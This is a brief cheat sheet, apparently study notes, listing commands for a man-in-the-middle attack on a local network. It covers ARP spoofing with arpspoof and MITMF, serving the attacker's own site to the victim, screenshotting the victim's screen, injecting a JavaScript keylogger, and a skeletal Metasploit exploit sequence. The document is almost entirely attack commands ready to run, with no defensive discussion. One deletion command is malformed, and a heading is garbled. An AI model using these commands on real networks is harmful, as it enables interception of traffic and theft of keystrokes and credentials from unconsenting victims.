### Man in the Middle Attack

```arpspoof -i eth0 -t 10.0.2.1 10.0.2.4```

M�TMF

```mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 ```

- **if it gives an error:**  ```rm - f /usr/share/mitmf/plugins/filepwn.py```

### Check Attack

```arp -a```

### Showing Our Own Site on the Other PC

```
leafpad /etc/mitmf/mitmf.conf
apache2 start // service apache2 start
```

### Getting SS on other PC

```mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 --screen```

### Seeing the Keys You Press

```mitmf --arp --spoof --gateway 10.0.2.4 --targets 10.0.2.1 -i eth0 --jskeylogger```

### MSF Console

```
msfconsole
use ...
show options
set RHOST 10.0.2.4
show options
exploit
```